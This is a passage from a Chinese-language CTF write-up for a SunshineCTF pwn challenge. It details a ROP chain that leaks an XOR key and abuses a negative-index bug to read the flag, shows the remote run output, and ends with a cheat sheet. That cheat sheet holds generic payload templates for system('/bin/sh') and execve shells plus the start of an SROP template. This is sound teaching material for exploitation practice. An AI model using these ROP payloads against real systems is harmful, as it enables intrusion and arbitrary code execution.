\NormalTok{401f1e:  }\BuiltInTok{lea}  \KeywordTok{rsi}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x110b}\OperatorTok{]}      \CommentTok{; "OK\textbackslash{}n"}
\NormalTok{401f25:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{401f2a:  }\ControlFlowTok{call}\NormalTok{ write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt             }\CommentTok{; ← 這次 write 的回傳值 = 3，蓋掉了 rax！}
\NormalTok{401f2f:  }\BuiltInTok{add}  \KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x40}
\NormalTok{401f33:  }\BuiltInTok{pop}  \KeywordTok{rbx}
\NormalTok{401f34:  }\ControlFlowTok{ret}
\end{Highlighting}
\end{Shaded}

  所以鏈開始執行的那一刻
  \textbf{\texttt{rax\ \allowbreak{}=\ \allowbreak{}3}}（\texttt{write("OK\textbackslash{}\allowbreak{}n")}
  的回傳值）。

  \begin{itemize}
  \tightlist
  \item
    第 1 個 \texttt{WRITE\_\allowbreak{}RDX\_\allowbreak{}RAX} → \texttt{write(1,\allowbreak{}\ \allowbreak{}0x405060,\allowbreak{}\ \allowbreak{}3)}
    → key 的前 3 bytes
  \item
    第 2 個 \texttt{WRITE\_\allowbreak{}RDX\_\allowbreak{}RAX} → \texttt{write(1,\allowbreak{}\ \allowbreak{}0x405063,\allowbreak{}\ \allowbreak{}3)}
    → 第 4 個 key byte + 2 bytes 雜訊
  \end{itemize}

  合計 \textbf{6 bytes}（4 bytes key + 2 bytes 雜訊）， 正好對應 exploit
  裡的 \texttt{leak\ \allowbreak{}=\ \allowbreak{}io.\allowbreak{}recvn(6)} 與 log 印出的
  \texttt{leak=1cf20c050000}。

  \begin{quote}
  ※提示 \textbf{典型 ROP 陷阱}：「gadget 執行完 \texttt{rax}
  是多少」跟你想像的常常不一樣。
  跳到函式中段時，函式\textbf{剩下的程式碼會繼續執行}，並且可能改掉
  \texttt{rax}。 唯一可靠的做法是在 gdb 裡實際看。
  \end{quote}
\item
  \texttt{key\ \allowbreak{}=\ \allowbreak{}leak{[}:\allowbreak{}4{]}}，得到 \texttt{1cf20c05}。
\end{itemize}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[+] XOR key = 1cf20c05
\end{Verbatim}

\paragraph{階段 3：把偽造封包寫進 fd
3}\label{ux968eux6bb5-3ux628aux507dux9020ux5c01ux5305ux5bebux9032-fd-3}

送到 \texttt{0x40a228}：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{req }\OperatorTok{=}\NormalTok{ xor\_key(p8(}\DecValTok{3}\NormalTok{) }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00\textbackslash{}x04}\StringTok{\textquotesingle{}} \OperatorTok{+}\NormalTok{ p8(}\DecValTok{0}\NormalTok{) }\OperatorTok{+}\NormalTok{ p32(}\BaseNTok{0xfffffffc}\NormalTok{), key)}
\NormalTok{chain  }\OperatorTok{=}\NormalTok{ [POP\_RDI, }\DecValTok{3}\NormalTok{, POP\_RSI, A2, WRITE\_RDX\_RAX]   }\CommentTok{\# write(3, A2, rdx)}
\NormalTok{chain }\OperatorTok{+=}\NormalTok{ [POP\_RSI, A2}\OperatorTok{+}\DecValTok{3}\NormalTok{, WRITE\_RDX\_RAX]             }\CommentTok{\# write(3, A2+3, rdx)}
\NormalTok{chain }\OperatorTok{+=}\NormalTok{ [POP\_RSI, A2}\OperatorTok{+}\DecValTok{6}\NormalTok{, WRITE\_RDX\_RAX]             }\CommentTok{\# write(3, A2+6, rdx)}
\NormalTok{chain }\OperatorTok{+=}\NormalTok{ [POP\_RBX, }\BaseNTok{0xff}\NormalTok{, SUBMIT\_READ]}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \texttt{rdx\ \allowbreak{}=\ \allowbreak{}rax\ \allowbreak{}=\ \allowbreak{}上一次\ \allowbreak{}write\ \allowbreak{}的回傳值\ \allowbreak{}=\ \allowbreak{}3}，所以每次只能寫
  3 bytes → 切成 3 段寫完 9 bytes。
\item
  ※注意 \textbf{為什麼可以多送第 9 個 byte？} \texttt{req} 其實只有 8
  bytes（\texttt{p8(3)\ \allowbreak{}+\ \allowbreak{}b\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}x00\textbackslash{}\allowbreak{}x04\textquotesingle{}\allowbreak{}\ \allowbreak{}+\ \allowbreak{}p8(0)\ \allowbreak{}+\ \allowbreak{}p32(0xfffffffc)}），
  但鏈是 3 + 3 + 3 = 9 bytes 送出去的，第 9 個 byte 是
  \texttt{d2{[}8{]}}（= \texttt{0x00}）。
  它\textbf{不會}被這次的封包用掉，而是留在 socket
  裡等保險箱下一次讀標頭 ------
  對本次流程無害（保險箱下一次讀標頭時，\texttt{op\ \allowbreak{}=\ \allowbreak{}0} 不是
  1\textasciitilde4，只會回一個錯誤， 而那時我們已經把 flag 印完了）。
  \textbf{不要以為「多送 1 byte
  不會被檢查」是通則}：這裡能混過去，是因為 「多出來的 byte
  剛好落在下一條協定訊息的最前面，而我們不在乎那條訊息」。
\item
  保險箱收到後執行 \texttt{op=3,\allowbreak{}\ \allowbreak{}index=-\allowbreak{}4} →
  \texttt{pread(flag\_\allowbreak{}fd,\allowbreak{}\ \allowbreak{}...)} → 回傳 flag。
\end{itemize}

\paragraph{階段 4：把 flag
印出來}\label{ux968eux6bb5-4ux628a-flag-ux5370ux51faux4f86}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{time.sleep(}\FloatTok{0.7}\NormalTok{)                       }\CommentTok{\# 等保險箱的回覆到齊}
\NormalTok{d3[}\BaseNTok{0x40}\NormalTok{:}\BaseNTok{0x48}\NormalTok{] }\OperatorTok{=}\NormalTok{ p64(RESP)             }\CommentTok{\# rbx = A3+0x60  (RELAY 的緩衝區 = rsp+0x10)}
\NormalTok{d3[}\BaseNTok{0x48}\NormalTok{:}\BaseNTok{0x50}\NormalTok{] }\OperatorTok{=}\NormalTok{ p64(}\BaseNTok{0x401fda}\NormalTok{)         }\CommentTok{\# ret → read(3, rbx, 0x100) + 解密 + 印出}
\end{Highlighting}
\end{Shaded}

進入 \texttt{0x401fda} 時 \textbf{\texttt{rsp\ \allowbreak{}=\ \allowbreak{}A3\ \allowbreak{}+\ \allowbreak{}0x50}}（因為
\texttt{ret} 已經把 \texttt{{[}A3+0x48{]}} 這個目標位址彈掉了，
\texttt{A3+0x48} 是鏈的第 0 個 qword，彈掉之後 \texttt{rsp} 前進 8 →
變成 \texttt{A3+0x50}）。

接下來 \texttt{RELAY}（\texttt{0x401fda} 之後）解析標頭時，全部都以
\textbf{\texttt{rsp+0x10}} 為基準：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{40200a:  }\BuiltInTok{movsx} \KeywordTok{dx}\OperatorTok{,} \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x11}\OperatorTok{]}      \CommentTok{; 標頭 byte1}
\NormalTok{402010:  }\BuiltInTok{movsx} \KeywordTok{ax}\OperatorTok{,} \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x12}\OperatorTok{]}      \CommentTok{; 標頭 byte2}
\NormalTok{40201b:  }\BuiltInTok{cmp}  \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x10}\OperatorTok{],}\BaseNTok{0x0}       \CommentTok{; 標頭 byte0 (op)}
\NormalTok{402032:  }\BuiltInTok{lea}  \KeywordTok{rsi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x14}\OperatorTok{]}                \CommentTok{; payload 起點 = 標頭 + 4}
\end{Highlighting}
\end{Shaded}

所以收到的資料（標頭）必須落在 \texttt{rsp+0x10}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
RESP = (A3 + 0x50) + 0x10 = A3 + 0x60
\end{Verbatim}

而且 \texttt{0x401fda} 的第一道指令是 \texttt{mov\ \allowbreak{}rsi,\allowbreak{}rbx}，它是拿
\textbf{\texttt{rbx}} 當 \texttt{read} 的目的位址， 所以我們也要在鏈裡把
\texttt{rbx} 設成 \texttt{RESP} ------ 這就是上面
\texttt{d3{[}0x40:\allowbreak{}0x48{]}\ \allowbreak{}=\ \allowbreak{}p64(RESP)} 的用途 （\texttt{pop\ \allowbreak{}rbx} 讀
\texttt{{[}A3+0x40{]}}）。兩者必須一致：\texttt{rbx\ \allowbreak{}==\ \allowbreak{}rsp+0x10\ \allowbreak{}==\ \allowbreak{}A3+0x60}。

\begin{quote}
※注意 我們是\textbf{跳到 \texttt{0x401fda}（\texttt{RELAY} 的中段）}，
所以 \texttt{RELAY} 開頭那條 \texttt{0x401fb9:\allowbreak{}\ \allowbreak{}lea\ \allowbreak{}rbx,{[}rsp+0x10{]}}
\textbf{不會執行}， \texttt{rbx}
完全是我們自己設的。位址算對、\texttt{rbx} 設對，兩件事缺一不可。
\end{quote}

\texttt{read(3,\allowbreak{}\ \allowbreak{}RESP,\allowbreak{}\ \allowbreak{}0x100)} 收到標頭 +
flag，接著解密、檢查（\texttt{op==0}、
\texttt{len\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}收到長度-\allowbreak{}4}）、然後
\texttt{write(1,\allowbreak{}\ \allowbreak{}payload,\allowbreak{}\ \allowbreak{}len)} ------ \textbf{flag 就印出來了。}

\begin{quote}
※提示 exploit 最後用的 \texttt{io.\allowbreak{}recvall(timeout=3)} 意思是「一直收到 3
秒內沒有新資料為止」， 用來把 \texttt{OK\textbackslash{}\allowbreak{}n} + flag
一次收乾淨，不需要知道確切長度。 （相對地，前面洩漏 key 時長度確定是 6
bytes，所以用 \texttt{io.\allowbreak{}recvn(6)}。）
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{8. 執行結果}\label{ux57f7ux884cux7d50ux679c}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ python3 exploit.py REMOTE
[+] Opening connection to chal.sunshinectf.games on port 26007: Done
[*] stage2 pre=b'OK\n' leak=1cf20c050000 A2=0x40a228
[+] XOR key = 1cf20c05
[*] stage3 d2ok=b'OK\n' A3=0x40a2e0 RESP=0x40a340
[+] raw  : b'OK\nsun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n\n'

[+] FLAG: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
\end{Verbatim}

本地（\texttt{flag.\allowbreak{}txt} = \texttt{SUNSHINE\{\allowbreak{}local\_\allowbreak{}test\_\allowbreak{}flag\}\allowbreak{}}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[+] raw  : b'OK\nSUNSHINE{local_test_flag}\n\n'
\end{Verbatim}

✓ \textbf{Flag：\texttt{sun\{\allowbreak{}n3gat1ve\_\allowbreak{}h4ndl3s\_\allowbreak{}0pen\_\allowbreak{}s3cret\_\allowbreak{}d00rs\}\allowbreak{}}}
（``negative handles open secret doors'' ------ 就是在講負索引越界 :)）

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{9. 常見坑}\label{ux5e38ux898bux5751-1}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{\texttt{p16()} 是大端還小端？} → pwntools 的是
  \textbf{little-endian}。 本題的長度欄位是
  \textbf{big-endian}，要自己寫
  \texttt{b\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}x00\textbackslash{}\allowbreak{}x04\textquotesingle{}\allowbreak{}}。
  送錯會讓保險箱以為 \texttt{len\ \allowbreak{}=\ \allowbreak{}0x0400}，然後永遠等 1024 bytes
  而卡死。
\item
  \textbf{XOR keystream 的順序。} \texttt{bswap} +
  \texttt{shr\ \allowbreak{}eax,\allowbreak{}0x18} 的組合 讓 keystream 是 key 反過來 ------ 不是
  \texttt{key{[}i\&\allowbreak{}3{]}}，而是 \texttt{key{[}3-(i\&\allowbreak{}3){]}}。
  寫錯會送出一堆亂碼。
\item
  \textbf{\texttt{bl} 只有 8 bits。} \texttt{SUBMIT\ \allowbreak{}256} 的 \texttt{bl}
  會是 \texttt{0}。 要注意實際發生的事：程式在\textbf{還沒進
  \texttt{read} 之前}就被擋下來了 ------ \texttt{0x401eed:\allowbreak{}\ \allowbreak{}test\ \allowbreak{}al,\allowbreak{}al}
  / \texttt{0x401eef:\allowbreak{}\ \allowbreak{}je\ \allowbreak{}0x401f38}， 跳到 \texttt{0x401f38} 後印出
  \texttt{ERR\ \allowbreak{}bad\ \allowbreak{}size}，然後
  \texttt{add\ \allowbreak{}rsp,\allowbreak{}0x40;\ \allowbreak{}mov\ \allowbreak{}edx,\allowbreak{}0xd;\ \allowbreak{}mov\ \allowbreak{}edi,\allowbreak{}1;\ \allowbreak{}lea\ \allowbreak{}rsi,{[}rip+…{]};\ \allowbreak{}pop\ \allowbreak{}rbx;\ \allowbreak{}jmp\ \allowbreak{}write@plt}
  ------ 結尾是\textbf{尾呼叫（tail call）\texttt{jmp\ \allowbreak{}write@plt}，不是
  \texttt{ret}} （\texttt{write} 返回時直接回到呼叫端；跟
  \texttt{0x401f34} 的 \texttt{ret} 不一樣）。 （所以「\texttt{read} 讀
  0 bytes 什麼都不會發生」並不正確 ------ 根本不會走到 \texttt{read}。）
  實測：\texttt{printf\ \allowbreak{}\textquotesingle{}\allowbreak{}SUBMIT\ \allowbreak{}256\textbackslash{}\allowbreak{}n\textquotesingle{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}./\allowbreak{}service}
  → \texttt{ERR\ \allowbreak{}bad\ \allowbreak{}size}。 要用的長度必須是 1\textasciitilde255。
\item
  \textbf{\texttt{read(0,\allowbreak{}rsp,\allowbreak{}bl)} 讀進來的資料是「從 \texttt{rsp}
  開始」}， 而 read 回傳後程式還會
  \texttt{add\ \allowbreak{}rsp,\allowbreak{}0x40;\ \allowbreak{}pop\ \allowbreak{}rbx;\ \allowbreak{}ret}。
  所以每一段鏈的佈局是：\textbf{\texttt{read} 目標 + \texttt{0x40} =
  \texttt{rbx}、\texttt{read} 目標 + \texttt{0x48} = 鏈的第 0 個
  qword}（階段 1 的「\texttt{read} 目標」是 \texttt{SUBMIT} 當時的
  \texttt{rsp}；階段 2 之後是 \texttt{A1} / \texttt{A2} /
  \texttt{A3}）。 忘記補這個 offset 是最常見的錯。
\item
  \textbf{\texttt{rdx} 不能靠 \texttt{pop\ \allowbreak{}rdx}。} 這支程式\textbf{沒有
  \texttt{pop\ \allowbreak{}rdx}
  gadget}（\texttt{grep\ \allowbreak{}\textquotesingle{}\allowbreak{}pop\ \allowbreak{}\ \allowbreak{}\ \allowbreak{}\ \allowbreak{}rdx\textquotesingle{}\allowbreak{}}
  沒有輸出）， 所以設不了長度。→ 用
  \texttt{0x401c32}（\texttt{mov\ \allowbreak{}rdx,\allowbreak{}rax;\ \allowbreak{}jmp\ \allowbreak{}write}）。
  （補充：glibc 的 \texttt{read}/\texttt{write} wrapper
  其實\textbf{不會}動 \texttt{rdx}， 真正的理由就是「沒有
  \texttt{pop\ \allowbreak{}rdx}」。）
\item
  \textbf{seccomp 讓 \texttt{execve} 直接殺掉行程。} 如果你不小心跳到
  \texttt{system()}，你會看到行程「莫名其妙就死了」------ 那是
  \texttt{SECCOMP\_\allowbreak{}RET\_\allowbreak{}KILL\_\allowbreak{}PROCESS}。用 \texttt{seccomp-\allowbreak{}tools\ \allowbreak{}dump}
  或 手動解 BPF 就能確認。
\item
  \textbf{\texttt{fork()} 之後 key 共用，但 \texttt{getpid()} 不同。}
  保險箱的 \texttt{getpid()} 是子行程的，但 key 是\textbf{父行程 fork
  前}算好寫進記憶體的， 所以兩邊一致。不要試圖自己算 key，要用洩漏的。
\item
  \textbf{\texttt{time.\allowbreak{}sleep(0.\allowbreak{}7)} 不是裝飾。} 保險箱是非同步的， 太早去
  \texttt{read(3,\allowbreak{}\ \allowbreak{}...)} 會讀不到完整資料，RELAY
  的長度檢查就會失敗而不印 flag。
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{10. 一頁速查}\label{ux4e00ux9801ux901fux67e5-1}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
架構   : fork 出前台(seccomp, 我們對話的對象) + 保險箱(有 flag fd)
seccomp: 只允許 read/write/close/mmap/mprotect/brk/rt_sigreturn/exit_group
         → 不能 execve，只能借保險箱的手

漏洞 1 : SUBMIT 0x401ed0  read(0, rsp, bl) 進 0x40 緩衝區 (offset 0x48 = ret)
漏洞 2 : 前台無法自己送「長度 > 0 的封包」給保險箱（RELAY 0x401fb2 xor eax,eax
         → 標頭長度永遠 0），而 binary 裡沒有 pop rdx → 要自己想辦法組封包
漏洞 3 : 保險箱 op3 用 movsxd + jg 檢查 index → 負索引
         index=-4 → 0x4060b0-0x1030 = 0x405080 = fd 槽#0 (flag fd) → pread 讀 flag

利用   :
 1. NOTE 0 <3 bytes>  → .bss[0x40a180] = 0x401f07
 2. SUBMIT 112        → 溢位 → pop rsp 搬到 0x40a168 → ret 到 0x401f07
 3. read(0, rsp, 0xff) 續接；鏈一開始 rax = 3（被 SUBMIT 的 write(1,"OK\n",3) 蓋掉），
    所以兩次 write(1, KEY, 3) + write(1, KEY+3, 3) = 只洩漏 6 bytes 的 key
 4. write(3, req, 3) x3 送出 {op=3, len=4, pad=0, index=-4}（已加密）
 5. ret 到 0x401fda → read(3, RESP, 0x100) + 解密 + 印出 → flag
\end{Verbatim}

\begin{quote}
※注意 一定要 \texttt{cd\ \allowbreak{}pwn7/}
之後再跑（\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py}）， 因為 exploit 用的是相對路徑
\texttt{./\allowbreak{}service}； 或直接用 \texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh}（它會自動 cd
進各題目目錄）。 在 repo 根目錄執行會看到
\texttt{{[}ERROR{]}\ \allowbreak{}\textquotesingle{}\allowbreak{}./\allowbreak{}service\textquotesingle{}\allowbreak{}\ \allowbreak{}does\ \allowbreak{}not\ \allowbreak{}exist}。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 9 --- 速查表}\label{part-9-ux901fux67e5ux8868}

\begin{quote}
原始檔案：\texttt{wp/\allowbreak{}99\_\allowbreak{}速查表.\allowbreak{}md}
\end{quote}

\subsection{速查表（Cheat Sheet）}\label{ux901fux67e5ux8868cheat-sheet}

解題時放在旁邊看的東西。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1.
五秒判斷保護}\label{ux4e94ux79d2ux5224ux65b7ux4fddux8b77}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# 首選：不用裝任何東西（pwntools 自帶），任何機器都跑得動}
\ExtensionTok{python3} \AttributeTok{{-}c} \StringTok{"from pwn import *; print(ELF(\textquotesingle{}./chal\textquotesingle{}, checksec=False).checksec())"}

\CommentTok{\# 或者：如果你的系統有 \textasciigrave{}checksec\textasciigrave{} 這個「獨立指令」}
\ExtensionTok{checksec} \AttributeTok{{-}{-}file}\OperatorTok{=}\NormalTok{./chal}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意 \textbf{\texttt{checksec} 不是每個系統都有}（Arch 要
\texttt{pacman\ \allowbreak{}-\allowbreak{}S\ \allowbreak{}checksec}、Debian/Ubuntu 要
\texttt{sudo\ \allowbreak{}apt\ \allowbreak{}install\ \allowbreak{}checksec}；就算用 pip 裝了 pwntools，那支
console script 也可能躺在 venv 的 \texttt{bin/} 裡而不在
\texttt{PATH}）。沒有它時打下去只會拿到 \texttt{command\ \allowbreak{}not\ \allowbreak{}found}
------ \textbf{那不是題目的問題，改用上面的 pwntools
一行版本就好}（兩者輸出內容一樣）。
\end{quote}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
保護
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
有
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
沒有
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
PIE & 要先 leak 程式碼位址才能用 gadget & gadget
位址直接寫死（non-PIE） \\
Canary & 溢位要先 leak canary（或不碰它） & 直接蓋返回位址 \\
NX & 不能跑 shellcode → 用 ROP & 可以塞 shellcode \\
Full RELRO & \texttt{.\allowbreak{}got} 與 \texttt{.\allowbreak{}got.\allowbreak{}plt} 都唯讀 → \textbf{不能改
GOT}（但 PLT 全部已解析，隨時可直接 \texttt{call\ \allowbreak{}system@plt}） &
見下一列 \\
Partial RELRO & \texttt{.\allowbreak{}got} 唯讀、\texttt{.\allowbreak{}got.\allowbreak{}plt} 可寫 →
\textbf{可以改 \texttt{xxx@got} 劫持函式}（本系列 pwn2 / pwn3 / pwn4 /
pwn6 都是 Partial） & No RELRO：GOT 完全可寫（pwn1） \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{2.
暫存器對應表}\label{ux66abux5b58ux5668ux5c0dux61c9ux8868}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}lll@{}}
\toprule\noalign{}
用途 & 函式呼叫 & 系統呼叫 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
參數 1 & \texttt{rdi} & \texttt{rdi} \\
參數 2 & \texttt{rsi} & \texttt{rsi} \\
參數 3 & \texttt{rdx} & \texttt{rdx} \\
參數 4 & \texttt{rcx} & \textbf{\texttt{r10}} \\
參數 5 & \texttt{r8} & \texttt{r8} \\
參數 6 & \texttt{r9} & \texttt{r9} \\
編號 & --- & \texttt{rax} \\
回傳值 & \texttt{rax} & \texttt{rax} \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{3. syscall 編號}\label{syscall-ux7de8ux865f}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
編號 & 名稱 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
0 & \texttt{read} \\
1 & \texttt{write} \\
2 & \texttt{open} \\
3 & \texttt{close} \\
9 & \texttt{mmap} \\
10 & \texttt{mprotect} \\
15 & \texttt{rt\_\allowbreak{}sigreturn} \\
59 & \texttt{execve} \\
60 & \texttt{exit} \\
231 & \texttt{exit\_\allowbreak{}group} \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{4. 常用 gadget
與用途}\label{ux5e38ux7528-gadget-ux8207ux7528ux9014}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
gadget & 用途 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{pop\ \allowbreak{}rdi\ \allowbreak{};\ \allowbreak{}ret} & 設第 1 個參數 \\
\texttt{pop\ \allowbreak{}rsi\ \allowbreak{};\ \allowbreak{}ret} & 設第 2 個參數 \\
\texttt{pop\ \allowbreak{}rdx\ \allowbreak{};\ \allowbreak{}ret} & 設第 3 個參數 \\
\texttt{pop\ \allowbreak{}rax\ \allowbreak{};\ \allowbreak{}ret} & 設 syscall 編號 \\
\texttt{syscall\ \allowbreak{};\ \allowbreak{}ret} & 執行 syscall \\
\texttt{ret} & 16-byte 對齊 \\
\texttt{leave\ \allowbreak{};\ \allowbreak{}ret} & \texttt{rsp\ \allowbreak{}=\ \allowbreak{}rbp} 的 pivot \\
\texttt{pop\ \allowbreak{}rsp\ \allowbreak{};\ \allowbreak{}...\allowbreak{}\ \allowbreak{};\ \allowbreak{}ret} & 直接設 \texttt{rsp} 的 pivot \\
\texttt{mov\ \allowbreak{}rdx,\allowbreak{}\ \allowbreak{}rax\ \allowbreak{};\ \allowbreak{}jmp\ \allowbreak{}write@plt} & 沒有 \texttt{pop\ \allowbreak{}rdx}
時的替代方案 \\
\end{longtable}
}

\begin{quote}
※提示 \texttt{@plt} 結尾＝「呼叫外部函式的跳板（stub）」，例如
\texttt{write@plt} 就是 「跳到 GOT 裡記的 \texttt{write}
真實位址」的那段程式碼------ 位址固定、可以直接放進 ROP 鏈。詳細原理見
\texttt{00\_\allowbreak{}基礎知識} 第 8 節。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{5. ROP 模板}\label{rop-ux6a21ux677f}

\paragraph{\texorpdfstring{5.1 \texttt{system("/\allowbreak{}bin/\allowbreak{}sh")}（libc
已知）}{5.1 system("/bin/sh")（libc 已知）}}\label{systembinshlibc-ux5df2ux77e5}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload  }\OperatorTok{=} \StringTok{b\textquotesingle{}A\textquotesingle{}} \OperatorTok{*}\NormalTok{ offset}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(RET)            }\CommentTok{\# 對齊用（movaps）}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RDI)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(binsh)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(SYSTEM)}
\end{Highlighting}
\end{Shaded}

\begin{quote}
對齊用的 \texttt{ret} 放在 \texttt{POP\_\allowbreak{}RDI} 之前或 \texttt{SYSTEM}
之前\textbf{都可以} ------ 效果一樣，重點是「整條鏈在 \texttt{rsp}
上總共多走 8 bytes」， 讓 \texttt{system} 開始執行時
\texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8}。不對齊就會在 \texttt{movaps} 的地方
SIGSEGV。 （原理見 \texttt{00\_\allowbreak{}基礎知識} 第 10.4 節）
\end{quote}

\paragraph{\texorpdfstring{5.2 \texttt{execve("/\allowbreak{}bin/\allowbreak{}sh",\allowbreak{}\ \allowbreak{}0,\allowbreak{}\ \allowbreak{}0)}（純
syscall）}{5.2 execve("/bin/sh", 0, 0)（純 syscall）}}\label{execvebinsh-0-0ux7d14-syscall}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload  }\OperatorTok{=} \StringTok{b\textquotesingle{}A\textquotesingle{}} \OperatorTok{*}\NormalTok{ offset}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RDI) }\OperatorTok{+}\NormalTok{ p64(binsh)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RSI) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RDX) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RAX) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{59}\NormalTok{)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(SYSCALL\_RET)}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{5.3 \texttt{read} 到已知可寫區（.bss）再
pivot}{5.3 read 到已知可寫區（.bss）再 pivot}}\label{read-ux5230ux5df2ux77e5ux53efux5bebux5340.bssux518d-pivot}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload  }\OperatorTok{=}\NormalTok{ p64(POP\_RDI) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{)       }\CommentTok{\# fd = stdin}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RSI) }\OperatorTok{+}\NormalTok{ p64(BSS)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RDX) }\OperatorTok{+}\NormalTok{ p64(}\BaseNTok{0x400}\NormalTok{)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(READ\_PLT)}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RSP) }\OperatorTok{+}\NormalTok{ p64(BSS)     }\CommentTok{\# 之後的鏈從 BSS 接}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6. SROP 模板}\label{srop-ux6a21ux677f}

\begin{quote}
※注意 用 \texttt{SigreturnFrame()} 之前一定要先設
\texttt{context.\allowbreak{}arch\ \allowbreak{}=\ \allowbreak{}\textquotesingle{}\allowbreak{}amd64\textquotesingle{}\allowbreak{}} （或
\texttt{context.\allowbreak{}clear(arch=\textquotesingle{}\allowbreak{}amd64\textquotesingle{}\allowbreak{})}），否則
pwntools 會直接報
\texttt{{[}ERROR{]}\ \allowbreak{}kernel\ \allowbreak{}architecture\ \allowbreak{}must\ \allowbreak{}be\ \allowbreak{}specified}。
這就是兩支 exploit 開頭都有那行的原因。
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
